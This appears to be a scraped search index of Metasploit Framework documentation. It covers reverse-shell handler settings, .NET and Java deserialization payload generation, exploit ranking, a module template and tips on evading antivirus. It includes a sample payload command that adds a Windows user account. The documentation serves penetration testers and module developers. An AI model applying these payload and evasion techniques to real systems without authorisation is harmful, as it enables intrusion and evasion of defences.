    "content": "LHOST is short for Local Host. This value represents the IP address or hostname that stagers and stages should attempt to connect to. It is where the handler can be reached. This doesn’t mean that this is where the handler actually exists. LHOST is a value that is meaning from the perspective of the target machine. This value is passed along as part of the configuration for stagers and stages and tells the target machine where to go to reach the handler, and so this has to map to a value that is reachable by the target. A handler obviously needs to listen on a host/IP for the incoming connection. In cases where the LHOST value, for example the address that the target is able to reach, is the same as that which the host can listen on, no extra work has to be done. The LHOST value is used by the handler. However, if some kind of NAT or port forward is enabled, or if the handler is behind a firewall, then setting LHOST isn’t enough. In order to listen on the appropriate interface, another setting must be used called ReverseListenerBindHost. This value tells the handler to listen on a different interface/IP, but it doesn’t change the fact that the LHOST value is given to the target when the stage is uploaded. In short, LHOST must always remain the IP/host that is routable from the target, and if this value is not the same as what the listener needs to bind to, then change the ReverseListenerBindHost value. If you’re attacking something across the Internet and you specify an internal IP in LHOST, you’re doing it wrong. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html#lhost",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html#lhost"
  },"62": {
    "doc": "Debugging Dead Meterpreter Sessions",
    "title": "LPORT",
    "content": "The principles of LHOST and ReverseListenerBindHost can be applied to LPORT and ReverseListenerBindPort as well. If you have port forwarding in place, and your listener needs to bind to a different port, then you need to make use of the ReverseListenerBindPort setting. The classic example of this case is where an attacker wants to make use of port 443, but rightfully doesn’t want to run Metasploit as root just so they can directly bind to ports lower than 1024. Instead, the set up a port forward (on their router, or using iptables) so that 443 forwards to 8443, with a goal of accepting connections on that port instead. To accommodate this scenario, the LHOST value must still contain 443, as this is the port that the target machine needs to establish communications on; 443 is the value that needs to go out with the stager and the stage configurations. Metasploit needs to bind locally to port 8443, and so the handler is configured so that ReverseListenerBindPort has this value instead. When the handler launches, it binds to 8443 and handles any connections it receives. When a stage is generated, it uses 443 from LHOST value to populate the configuration. If the attacker makes the mistake of either setting LPORT to 8443, or leaving LPORT as 443 and not using ReverseListenerBindPort, then the result is either a dead shell after the first stage, or no connect back at all. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html#lport",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html#lport"
  },"63": {
    "doc": "Debugging Dead Meterpreter Sessions",
    "title": "Check dead shells",
    "content": "There are a few things to check for when debugging a dead shell. Quick things to check . | Make sure that LHOST is set to a routable address from the target, and not a local listen address. | Make sure that LPORT is set to the port number that the target needs to connect to. | Make sure that ReverseListenerBindPort is set if port forwarding is enabled and the traffic is being routed to a different port. | Make sure that your listener’s configuration matches that of the target from an architecture perspective. If you mix x64 listeners with x86 payloads (and vice versa), things will go bad. | . Not so quick things to check . | If the target is running AntiVirus there’s a chance that the stage , for example metsrv, is being caught while being uploaded. reverse_tcp and reverse_http stagers download metsrv without any encryption, and so the content of the DLL is visible to anything watching on the wire. reverse_https can still get caught in cases where AV is doing MITM content inspection. In this case, consider encoding your payloads, or if possible using stageless Meterpreter instead. | . ",
    "url": "/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html#check-dead-shells",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html#check-dead-shells"
  },"64": {
    "doc": "Debugging Dead Meterpreter Sessions",
    "title": "Debugging Dead Meterpreter Sessions",
    "content": " ",
    "url": "/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html"
  },"65": {
    "doc": "Definition of Module Reliability Side Effects and Stability",
    "title": "Allowed Values",
    "content": "Stability . | Constant | Description | . | CRASH_SAFE | Module should not crash the service or OS | . | CRASH_SERVICE_RESTARTS | Module may crash the service, but it will restart | . | CRASH_SERVICE_DOWN | Module may crash the service, and remain down | . | CRASH_OS_RESTARTS | Module may crash the OS, but it will restart | . | CRASH_OS_DOWN | Module may crash the OS, and remain down | . | SERVICE_RESOURCE_LOSS | Module causes a resource to be unavailable for the service | . | OS_RESOURCE_LOSS | Module causes a resource to be unavailable for the OS | . Side Effects . | Constant | Description | . | ARTIFACTS_ON_DISK | Module leaves a payload, a dropper, etc, on the target machine | . | CONFIG_CHANGES | Module modifies some config file | . | IOC_IN_LOGS | Module leaves an indicator of compromise in the log(s) | . | ACCOUNT_LOCKOUTS | Module may cause an account to lock out | . | SCREEN_EFFECTS | Module shows something on the screen that a human may notice | . | PHYSICAL_EFFECTS | Module may produce physical effects in hardware (Examples: light, sound, or heat) | . | AUDIO_EFFECTS | Module may cause a noise (Examples: Audio output from the speakers or hardware beeps) | . Reliability . | Constant | Description | . | FIRST_ATTEMPT_FAIL | The module may fail for the first attempt | . | REPEATABLE_SESSION | The module is expected to get a session every time it runs | . | UNRELIABLE_SESSION | The module isn’t expected to get a shell reliably (such as only once) | . ",
    "url": "/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html#allowed-values",
    "relUrl": "/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html#allowed-values"
  },"66": {
    "doc": "Definition of Module Reliability Side Effects and Stability",
    "title": "Definition of Module Reliability Side Effects and Stability",
    "content": "New Metasploit modules are now required to contain a Notes section containing additional information such as the Stability, Reliability and SideEffects associated with running the module. Example: . def initialize(info = {}) super( update_info( info, 'Name' =&gt; 'Module name', 'Description' =&gt; %q{ Module description }, 'Author' =&gt; [ 'Author name' ], 'License' =&gt; MSF_LICENSE, 'References' =&gt; [ ['CVE', '2020-XXXX'] ], 'DisclosureDate' =&gt; '2020-03-26', 'Platform' =&gt; 'ruby', 'Arch' =&gt; ARCH_RUBY, 'Privileged' =&gt; false, 'Targets' =&gt; [['Automatic', {}]], 'DefaultTarget' =&gt; 0, # All new modules must contain the below information. See below for more details for allowed values 'Notes' =&gt; { 'Stability' =&gt; [...], 'Reliability' =&gt; [...], 'SideEffects' =&gt; [...] } ) ) end . ",
    "url": "/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html",
    "relUrl": "/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html"
  },"67": {
    "doc": "Dot Net Deserialization",
    "title": "Support Matrix",
    "content": "The following table outlines the supported gadget chains, formatters and the compatibility of each. | Gadget Chain Name | BinaryFormatter | LosFormatter | SoapFormatter | . | TextFormattingRunProperties | Yes | Yes | Yes | . | TypeConfuseDelegate | Yes | Yes | No | . | WindowsIdentity | Yes | Yes | Yes | . ",
    "url": "/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html#support-matrix",
    "relUrl": "/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html#support-matrix"
  },"68": {
    "doc": "Dot Net Deserialization",
    "title": "Basic Usage",
    "content": "The library is located in Msf::Util::DotNetDeserialization and contains the following methods which are intended for use by module authors. | #generate(cmd, gadget_chain:, formatter:) . This function will generate a serialized payload to execute the specified operating system command cmd. The command is serialized using the specified gadget_chain and formatted with the specified formatter. The gadget_chain and formatter options will be specific to the vulnerability that is being executed. This functions returns a string. | #generate_formatted(stream, formatter:) . Format a SerializedStream object, as created by #generate_gadget_chain. The stream will be formatted using the specified formatter and returned as a string. | #generate_gadget_chain(cmd, gadget_chain:) . Create a gadget chain to run the specified operating system command cmd. This returns a SerializedStream object which can be inspected and modified but must formatted (using #generate_formatted) before it is useful. | . #generate is the primary function and is functionally equivalent to the following. In the future the #generate_* functions may contain additional options specific to their respective chain or formatter. stream = generate_gadget_chain(cmd, gadget_chain) formatted = generate_formatted(stream, formatter) . Example Usage . The following example uses the TextFormattingRunProperties gadget chain formatted with the LosFormatter. serialized = ::Msf::Util::DotNetDeserialization.generate( cmd, # this is the Operating System command to run gadget_chain: :TextFormattingRunProperties, formatter: :LosFormatter ) . ",
    "url": "/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html#basic-usage",
    "relUrl": "/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html#basic-usage"
  },"69": {
    "doc": "Dot Net Deserialization",
    "title": "Command Line Tool",
    "content": "The library also has an interface available as a standalone command line tool which is suitable for creating payloads for single-use research purposes. This tool dot_net.rb is available in the tools/payloads/ysoserial directory. The arguments for this tool are aligned with those of YSoSerial.NET, allowing the arguments of basic invocations to be the same. It should be noted however that the supported gadgets and formatters are not the same. Help output: . Usage: ./dot_net.rb [options] Generate a .NET deserialization payload that will execute an operating system command using the specified gadget chain and formatter. Available formatters: * BinaryFormatter * LosFormatter * SoapFormatter Available gadget chains: * TextFormattingRunProperties * TypeConfuseDelegate * WindowsIdentity Example: ./dot_net.rb -c \"net user msf msf /ADD\" -f BinaryFormatter -g TextFormattingRunProperties Specific options: -c, --command &lt;String&gt; The command to run -f, --formatter &lt;String&gt; The formatter to use (default: BinaryFormatter) -g, --gadget &lt;String&gt; The gadget chain to use (default: TextFormattingRunProperties) -o, --output &lt;String&gt; The output format to use (default: raw, see: --list-output-formats) --list-output-formats List available output formats, for use with --output -h, --help Show this message . The -g / --gadget option maps to the gadget_chain argument for the generate functions while the -f / --formatter arguments maps to the formatter argument. ",
    "url": "/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html#command-line-tool",
    "relUrl": "/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html#command-line-tool"
  },"70": {
    "doc": "Dot Net Deserialization",
    "title": "Making Changes",
    "content": "Adding new gadget chains and formatters involves creating a new file in the respective library directory: lib/msf/util/dot_net_deserialization. The “native” gadget chain type is implemented following the MS-NRBF format and the Bindata records as defined in types/ subdirectory. Once the new gadget chain or formatter is implemented, it needs to be added to the main library file (dot_net_deserialization.rb). Since serialization chain generate is deterministic, a unit test should be added for any new gadget chain to ensure that the checksum of the BinaryFormatter representation is consistent. ",
    "url": "/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html#making-changes",
    "relUrl": "/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html#making-changes"
  },"71": {
    "doc": "Dot Net Deserialization",
    "title": "Further Reading",
    "content": "Since the .NET deserialization gadgets run operating system commands, the following resources can be helpful for module developers to deliver native payloads such as Meterpreter. | How to use command stagers | How to use Powershell in an exploit | . ",
    "url": "/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html#further-reading",
    "relUrl": "/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html#further-reading"
  },"72": {
    "doc": "Dot Net Deserialization",
    "title": "Dot Net Deserialization",
    "content": "Metasploit includes a library for leveraging .NET deserialization attacks. Using it within a module is very straight forward, the module author just needs to know two things: the gadget chain and the formatter. The library uses the same names for each of these values as the YSoSerial.NET project for compatibility, although the Metasploit library only supports a subset of the functionality. ",
    "url": "/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html",
    "relUrl": "/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html"
  },"73": {
    "doc": "Downloads by Version",
    "title": "Metasploit Framework Installers",
    "content": "These include Metasploit Framework only. Updates are built about once a day. See Nightly-Installers for installation instructions for Windows, OS X and Linux. ",
    "url": "/docs/development/maintainers/downloads-by-version.html#metasploit-framework-installers",
    "relUrl": "/docs/development/maintainers/downloads-by-version.html#metasploit-framework-installers"
  },"74": {
    "doc": "Downloads by Version",
    "title": "Metasploit Pro Installers",
    "content": "These include the Pro UI as well as Framework. Updates are released about once every other week for Windows and Linux. The pgp signatures below can be verified with the following public key . | Download Link | File Type | SHA1 | PGP | . | metasploit-4.21.0-windows-x64-installer.exe | Windows 64-bit | SHA1 | PGP | . | metasploit-4.21.0-linux-x64-installer.run | Linux 64-bit | SHA1 | PGP | . | metasploit-4.20.0-windows-x64-installer.exe | Windows 64-bit | SHA1 | PGP | . | metasploit-4.20.0-linux-x64-installer.run | Linux 64-bit | SHA1 | PGP | . | metasploit-4.19.1-windows-x64-installer.exe | Windows 64-bit | SHA1 | PGP | . | metasploit-4.19.1-linux-x64-installer.run | Linux 64-bit | SHA1 | PGP | . | metasploit-4.19.0-windows-x64-installer.exe | Windows 64-bit | SHA1 | PGP | . | metasploit-4.19.0-linux-x64-installer.run | Linux 64-bit | SHA1 | PGP | . | metasploit-4.18.0-windows-x64-installer.exe | Windows 64-bit | SHA1 | PGP | . | metasploit-4.18.0-linux-x64-installer.run | Linux 64-bit | SHA1 | PGP | . | metasploit-4.17.1-windows-x64-installer.exe | Windows 64-bit | SHA1 | PGP | . | metasploit-4.17.1-linux-x64-installer.run | Linux 64-bit | SHA1 | PGP | . ",
    "url": "/docs/development/maintainers/downloads-by-version.html#metasploit-pro-installers",
    "relUrl": "/docs/development/maintainers/downloads-by-version.html#metasploit-pro-installers"
  },"75": {
    "doc": "Downloads by Version",
    "title": "Metasploit Framework Source",
    "content": "Please see the Metasploit framework releases page for the release versions of Metasploit Framework. ",
    "url": "/docs/development/maintainers/downloads-by-version.html#metasploit-framework-source",
    "relUrl": "/docs/development/maintainers/downloads-by-version.html#metasploit-framework-source"
  },"76": {
    "doc": "Downloads by Version",
    "title": "Downloads by Version",
    "content": " ",
    "url": "/docs/development/maintainers/downloads-by-version.html",
    "relUrl": "/docs/development/maintainers/downloads-by-version.html"
  },"77": {
    "doc": "Evading Anti Virus",
    "title": "Evading Anti Virus",
    "content": " ",
    "url": "/docs/using-metasploit/intermediate/evading-anti-virus.html",
    "relUrl": "/docs/using-metasploit/intermediate/evading-anti-virus.html"
  },"78": {
    "doc": "Evading Anti Virus",
    "title": "Read these links",
    "content": ". | Why encoding does not matter, and how Metasploit generates exes | Facts and myths about antivirus evasion with Metasploit | Using metasm to avoid antivirus detection ghost writing asm | . There are approximately 14 million other resources out there on the why’s and wherefores of evading antivirus, but the about articles should get you started. ",
    "url": "/docs/using-metasploit/intermediate/evading-anti-virus.html#read-these-links",
    "relUrl": "/docs/using-metasploit/intermediate/evading-anti-virus.html#read-these-links"
  },"79": {
    "doc": "Exploit Ranking",
    "title": "Exploit Ranking",
    "content": "Every exploit module has been assigned a rank based on its potential impact to the target system. Users can search, categorize, and prioritize exploits based on rankings. The ranking is implemented by adding a Rank constant at the top of the class declaration in a module: . class MetasploitModule &lt; Msf::Exploit Rank = LowRanking def initialize(info={}) ... end ... end . The ranking values are one of the following, in descending order of reliability: . | Ranking | Description | . | ExcellentRanking | The exploit will never crash the service. This is the case for SQL Injection, CMD execution, RFI, LFI, etc. No typical memory corruption exploits should be given this ranking unless there are extraordinary circumstances (WMF Escape()). | . | GreatRanking | The exploit has a default target AND either auto-detects the appropriate target or uses an application-specific return address AFTER a version check. | . | GoodRanking | The exploit has a default target and it is the “common case” for this type of software (English, Windows 7 for a desktop app, 2012 for server, etc). Exploit does not auto-detect the target. | . | NormalRanking | The exploit is otherwise reliable, but depends on a specific version that is not the “common case” for this type of software and can’t (or doesn’t) reliably autodetect. | . | AverageRanking | The exploit is generally unreliable or difficult to exploit, but has a success rate of 50% or more for common platforms. | . | LowRanking | The exploit is nearly impossible to exploit (under 50% success rate) for common platforms. | . | ManualRanking | The exploit is unstable or difficult to exploit and is basically a DoS (15% success rate or lower). This ranking is also used when the module has no use unless specifically configured by the user (e.g.: exploit/unix/webapp/php_eval). | . The ranking value is available the module Class object as well as instances: . modcls = framework.exploits[\"windows/browser/ie_createobject\"] modcls.rank # =&gt; 600 modcls.rank_to_s # =&gt; \"excellent\" mod = modcls.new mod.rank # =&gt; 600 mod.rank_to_s # =&gt; \"excellent\" . ",
    "url": "/docs/using-metasploit/intermediate/exploit-ranking.html",
    "relUrl": "/docs/using-metasploit/intermediate/exploit-ranking.html"
  },"80": {
    "doc": "Java Deserialization",
    "title": "Example code",
    "content": "In this example: . | (L11) The module includes the Msf::Exploit::JavaDeserialization mixin. | This exposes the necessary methods. | . | (L79) Then it uses the generate_java_deserialization_for_payload method to create a serialized Java object based on the CommonsCollections2 YSoSerial payload that will execute the Metasploit payload. | Note that the Metasploit payload object is passed as-is, without any conversion. | . | . 09 include Msf::Exploit::Remote::HttpClient 10 include Msf::Exploit::Powershell 11 include Msf::Exploit::JavaDeserialization 12 13 def initialize(info = {}) ... 78 def exploit 79 java_payload = generate_java_deserialization_for_payload('CommonsCollections2', payload) 80 ciphertext = aes_encrypt(java_payload) . Once the serialized object is generated and stored as java_payload, it’s then sent to the target in an exploit-specific manner. ",
    "url": "/docs/development/developing-modules/libraries/deserialization/generating-ysoserial-java-serialized-objects.html#example-code",
    "relUrl": "/docs/development/developing-modules/libraries/deserialization/generating-ysoserial-java-serialized-objects.html#example-code"
  },"81": {
    "doc": "Java Deserialization",
    "title": "Methods",
    "content": "#generate_java_deserialization_for_payload(name, payload) . This method will generate a serialized Java object that when loaded will execute the specified Metasploit payload. The payload will be converted to an operating system command using one of the supported techniques contained within this method and then passed to #generate_java_deserialization_for_command. | name - The payload name parameter must be one of the supported payloads stored in the ysoserial cache. As of this writing, the list includes: BeanShelll1, Clogure, CommonBeanutils1, CommonsCollections2, CommonsCollections3, CommonsCollections4, CommonsCollections5, CommonsCollections6, Groovy1, Hibernate1, JBossInterceptors1, JRMPClient, JSON1, JavassistWeld1, Jdk7u21, MozillaRhino1, Myfaces1, ROME, Spring1, Spring2, and Vaadin1. While ysoserial includes additional payloads that are not listed above, they are unsupported by the library due to the need for complex inputs. Should there be use cases for additional payloads, please consider opening an issue and submitting a pull request to add support. | payload - The payload object to execute on the remote system. This is the native Metasploit payload object and it will be automatically converted to an operating system command using a technique suitable for the target platform and architecture. For example, x86 Windows payloads will be converted using a Powershell command. Not all platforms and architecture combinations are supported. Unsupported combinations will result in a RuntimeError being raised which will need to be handled by the module developer. | . #generate_java_deserialization_for_command(name, shell, command) . This method will generate a serialized Java object that when loaded will execute the specific operating system command using the specified shell. Invocation of the command through the shell effectively bypasses constraints on the characters within the operating system command. | name - The payload name parameter. This has the same significance as the name parameter for the #generate_java_deserialization_for_payload method. | shell - The shell to use for invoking the command. This value must be one of the following: . | bash - A modified version that will invoke the command using the bash executable | cmd - A modified version that will invoke the command using the Windows cmd.exe executable. | powershell - A modified version that will invoke the command using the Windows powershell.exe executable. | . | command - The operating system command to execute upon successful deserialization of the generated object. | . ",
    "url": "/docs/development/developing-modules/libraries/deserialization/generating-ysoserial-java-serialized-objects.html#methods",
    "relUrl": "/docs/development/developing-modules/libraries/deserialization/generating-ysoserial-java-serialized-objects.html#methods"
  },"82": {
    "doc": "Java Deserialization",
    "title": "Regenerating the ysoserial_payload JSON file (MAINTAINERS ONLY)",
    "content": "Neither module developers nor users need to concern themselves with the following. On occasion, Metasploit maintainers may want to re-run the script generation to incorporate new Java serialized objects from the ysoserial tool. To avoid invoking Java (and all its dependencies) at runtime, the serialized objects are generated and cached within a JSON file. The JSON file can be refreshed using a standalone Ruby script, which comes prepackaged with a Docker image that handles downloading ysoserial and necessary dependencies. The script, Dockerimage and a high-level runme.sh script is stored within tools/payloads/ysoserial. An example run looks like: . $ cd ~/git/r7/metasploit-framework/tools/payloads/ysoserial $ ./runme.sh Sending build context to Docker daemon 101.8MB Step 1/8 : FROM ubuntu ---&gt; cd6d8154f1e1 Step 2/8 : RUN apt update &amp;&amp; apt -y upgrade ---&gt; Using cache ---&gt; ba7e5691ed5a Step 3/8 : RUN apt install -y wget openjdk-8-jre-headless ruby-dev make gcc ---&gt; Using cache ---&gt; d38488663627 Step 4/8 : RUN wget -q https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial-original.jar ---&gt; Using cache ---&gt; 284ff722464b Step 5/8 : RUN wget -q https://github.com/pimps/ysoserial-modified/raw/master/target/ysoserial-modified.jar ---&gt; Using cache ---&gt; 334c1ccb6fab Step 6/8 : RUN gem install --silent diff-lcs json pry ---&gt; Using cache ---&gt; 9d452be9d01f Step 7/8 : COPY find_ysoserial_offsets.rb / ---&gt; 61b6f339590c Step 8/8 : CMD ruby /find_ysoserial_offsets.rb ---&gt; Running in ba7b14646e56 Removing intermediate container ba7b14646e56 ---&gt; f4ca5ecb6848 Successfully built f4ca5ecb6848 Successfully tagged ysoserial-payloads:latest Generating payloads for BeanShell1... Generating payloads for C3P0... Error while generating or serializing payload java.lang.IllegalArgumentException: Command format is: &lt;base_url&gt;:&lt;classname&gt; at ysoserial.payloads.C3P0.getObject(C3P0.java:48) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'C3P0' and it will not be supported Generating payloads for Clojure... Generating payloads for CommonsBeanutils1... Generating payloads for CommonsCollections1... Generating payloads for CommonsCollections2... Generating payloads for CommonsCollections3... Generating payloads for CommonsCollections4... Generating payloads for CommonsCollections5... Generating payloads for CommonsCollections6... Generating payloads for FileUpload1... Error while generating or serializing payload java.lang.IllegalArgumentException: Unsupported command [] at ysoserial.payloads.FileUpload1.getObject(FileUpload1.java:71) at ysoserial.payloads.FileUpload1.getObject(FileUpload1.java:40) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'FileUpload1' and it will not be supported Generating payloads for Groovy1... Generating payloads for Hibernate1... Generating payloads for Hibernate2... Error while generating or serializing payload java.sql.SQLException: DataSource name cannot be empty string at javax.sql.rowset.BaseRowSet.setDataSourceName(BaseRowSet.java:855) at com.sun.rowset.JdbcRowSetImpl.setDataSourceName(JdbcRowSetImpl.java:4307) at ysoserial.payloads.Hibernate2.getObject(Hibernate2.java:58) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'Hibernate2' and it will not be supported Generating payloads for JBossInterceptors1... Generating payloads for JRMPClient... Generating payloads for JRMPListener... Error while generating or serializing payload java.lang.NumberFormatException: For input string: \"\" at java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) at java.lang.Integer.parseInt(Integer.java:592) at java.lang.Integer.parseInt(Integer.java:615) at ysoserial.payloads.JRMPListener.getObject(JRMPListener.java:42) at ysoserial.payloads.JRMPListener.getObject(JRMPListener.java:34) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'JRMPListener' and it will not be supported Generating payloads for JSON1... Generating payloads for JavassistWeld1... Generating payloads for Jdk7u21... Generating payloads for Jython1... Error while generating or serializing payload java.lang.IllegalArgumentException: Unsupported command [] at ysoserial.payloads.Jython1.getObject(Jython1.java:52) at ysoserial.payloads.Jython1.getObject(Jython1.java:42) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'Jython1' and it will not be supported Generating payloads for MozillaRhino1... Generating payloads for Myfaces1... Generating payloads for Myfaces2... Error while generating or serializing payload java.lang.IllegalArgumentException: Command format is: &lt;base_url&gt;:&lt;classname&gt; at ysoserial.payloads.Myfaces2.getObject(Myfaces2.java:47) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'Myfaces2' and it will not be supported Generating payloads for ROME... Generating payloads for Spring1... Generating payloads for Spring2... Generating payloads for URLDNS... Error while generating or serializing payload java.net.MalformedURLException: no protocol: at java.net.URL.&lt;init&gt;(URL.java:593) at ysoserial.payloads.URLDNS.getObject(URLDNS.java:56) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'URLDNS' and it will not be supported Generating payloads for Vaadin1... Generating payloads for Wicket1... Error while generating or serializing payload java.lang.IllegalArgumentException: Bad command format. at ysoserial.payloads.Wicket1.getObject(Wicket1.java:59) at ysoserial.payloads.Wicket1.getObject(Wicket1.java:49) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'Wicket1' and it will not be supported DONE! Successfully generated 0 static payloads and 22 dynamic payloads. Skipped 8 unsupported payloads. At completion, the data/ysoserial_payloads.json file is overwritten and the 22 dynamic payloads are ready for use within the framework. Afterward, the developer should follow the standard git procedures to add and commit the new JSON file before generating a pull request and landing the updated JSON into the framework’s master branch. ",
    "url": "/docs/development/developing-modules/libraries/deserialization/generating-ysoserial-java-serialized-objects.html#regenerating-the-ysoserial_payload-json-file-maintainers-only",
    "relUrl": "/docs/development/developing-modules/libraries/deserialization/generating-ysoserial-java-serialized-objects.html#regenerating-the-ysoserial_payload-json-file-maintainers-only"
  },"83": {
    "doc": "Java Deserialization",
    "title": "Java Deserialization",
    "content": "Instead of embedding static Java serialized objects, Metasploit offers ysoserial-generated binaries with built-in randomization. The benefits of using the Metasploit library include quicker module development, easier-to-read code, and future-proof Java serialized objects. To use the ysoserial libraries, let’s look at an example from the shiro_rememberme_v124_deserialize module: . ",
    "url": "/docs/development/developing-modules/libraries/deserialization/generating-ysoserial-java-serialized-objects.html",
    "relUrl": "/docs/development/developing-modules/libraries/deserialization/generating-ysoserial-java-serialized-objects.html"
  },"84": {
    "doc": "Writing an exploit",
    "title": "On this page",
    "content": ". | Plan your module | Ranking | Template | Basic git commands | References | . The real kung-fu behind exploit development isn’t actually about which language you choose to build it; it’s about your precise understanding of how input is processed by the application you’re debugging, and how to gain control by manipulating it. That’s right; the keyword is “debugging.” Your binjitsu (reverse-engineering) is where the real kung-fu is. However, if your goal isn’t just about popping a calculator, but actually want to weaponize, to maintain, and to provide use in the practical world, you need a development framework. And this is where Metasploit comes in. It’s a framework that’s free and open-source, actively contributed by researchers around the world. So when you write a Metasploit exploit, you don’t have to worry about any dependency issues, or having the wrong version, or not having enough payloads for different pentesting scenarios to choose from, etc. The idea is all you need to do is focus on building that exploit, and nothing more. ",
    "url": "/docs/development/developing-modules/guides/get-started-writing-an-exploit.html#on-this-page",
    "relUrl": "/docs/development/developing-modules/guides/get-started-writing-an-exploit.html#on-this-page"
  },"85": {
    "doc": "Writing an exploit",
    "title": "Plan your module",
    "content": "First, ask yourself will exploiting this vulnerability result in executing a payload? If not, then despite exploiting a vulnerability, for Metasploit’s purposes the module would fall into the auxiliary category. Unlike writing a proof-of-concept, when you write a Metasploit module, you need to think about how users might use it in the real world. Stealth is usually an important element to think about. Can your exploit achieve code execution without dropping a file? Can the input look more random, so it’s more difficult to detect? How about obfuscation? Is it generating unnecessary traffic? Can it be more stable without crashing the system? . Try to be precise about exploitable requirements. Usually, a bug is specific to a range of versions or even builds. If you can’t automatically check that, you need to at least mention it in the description somewhere. Some of your exploit’s techniques might also be application-specific. For example, you can take advantage of a specific behavior in the application to generate heap allocations the way you want, but maybe it’s noisier in the newer version, so that gives you some stability issues. Does it need a 3rd-party component to work that may not even be installed by everyone? Even if it is, is the component revised often enough that it could make your exploit less reliable? . Know that in the real world, your exploit can break or fail in a lot of different ways. You should try to find out and fix it during the development and testing phase before learning the hard way. ",
    "url": "/docs/development/developing-modules/guides/get-started-writing-an-exploit.html#plan-your-module",
    "relUrl": "/docs/development/developing-modules/guides/get-started-writing-an-exploit.html#plan-your-module"
  },"86": {
    "doc": "Writing an exploit",
    "title": "Ranking",
    "content": "As you can see, reliability is important to Metasploit, and we try to be more friendly about this for the users. I know what you’re thinking: “Well, if they’re using the exploit, they should understand how it works, so they know what they’re getting themselves into.” In the perfect world, yes. Knowing how a vulnerability works or how an exploit works will only benefit the user, but you see, we don’t live in the perfect world. If you’re in the middle of a penetration test, it’s very unlikely to always find the time to recreate the vulnerable environment, strip the exploit to the most basic form to debug what’s going on, and then do testing. Chances are you have a tight schedule to break into a large network, so you need to use your time carefully. Because of this, it’s important to at least have a good description and good references for the module. And of course, a ranking system that can be trusted. The Metasploit Framework has seven different rankings to indicate how reliable an exploit is. See Exploit Ranking for more details. ",
    "url": "/docs/development/developing-modules/guides/get-started-writing-an-exploit.html#ranking",
    "relUrl": "/docs/development/developing-modules/guides/get-started-writing-an-exploit.html#ranking"
  },"87": {
    "doc": "Writing an exploit",
    "title": "Template",
    "content": "If you have read this far, we think you are pretty impressive because it’s a lot to digest. You are probably wondering why we haven’t had a single line of code to share in the writeup. Well, as you recall, exploit development is mostly about your reversing skills. If you have all that, we shouldn’t be telling you how to write an exploit. What we’ve done so far is hopefully get your mindset dialed-in correctly about what it means to become a Metasploit exploit developer for the security community; the rest is more about how to use our mixins to build that exploit. Well, there are A LOT of mixins, so it’s impossible to go over all of them in a single page, so you must either read the API documentation, existing code examples, or look for more wiki pages we’ve written to cover specific mixins. For example, if you’re looking for a writeup about how to interact with an HTTP server, you might be interested in: How to send an HTTP Request Using HTTPClient. If you’re interested in browser exploit writing, definitely check out: How to write a browser exploit using BrowserExploitServer, etc. But of course, to begin, you most likely need a template to work with, and here it is. We’ll also explain how to fill out the required fields: . ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking def initialize(info={}) super(update_info(info, 'Name' =&gt; \"[Vendor] [Software] [Root Cause] [Vulnerability type]\", 'Description' =&gt; %q{ Say something that the user might need to know }, 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ 'Name' ], 'References' =&gt; [ [ 'URL', '' ] ], 'Platform' =&gt; 'win', 'Targets' =&gt; [ [ 'System or software version', { 'Ret' =&gt; 0x41414141 # This will be available in `target.ret` } ] ], 'Payload' =&gt; { 'BadChars' =&gt; \"\\x00\" }, 'Privileged' =&gt; false, 'DisclosureDate' =&gt; \"\", 'DefaultTarget' =&gt; 0)) end def check # For the check command end def exploit # Main function end end . | Name - The Name field should begin with the name of the vendor, followed by the software. Ideally, the “Root Cause” field means which component or function the bug is found. And finally, the type of vulnerability the module is exploiting. | Description - The Description field should explain what the module does, things to watch out for, specific requirements, the more, the better. The goal is to let the user understand what he’s using without the need to actually read the module’s source and figure things out. And trust me, most of them don’t. | Author field is where you put your name. The format should be “Name “. If you want to have your Twitter handle there, leave it as a comment, for example: “Name # handle” . | References - The References field is an array of references related to the vulnerability or the exploit. For example, an advisory, a blog post, etc. Make sure you use known reference identifiers – see Module 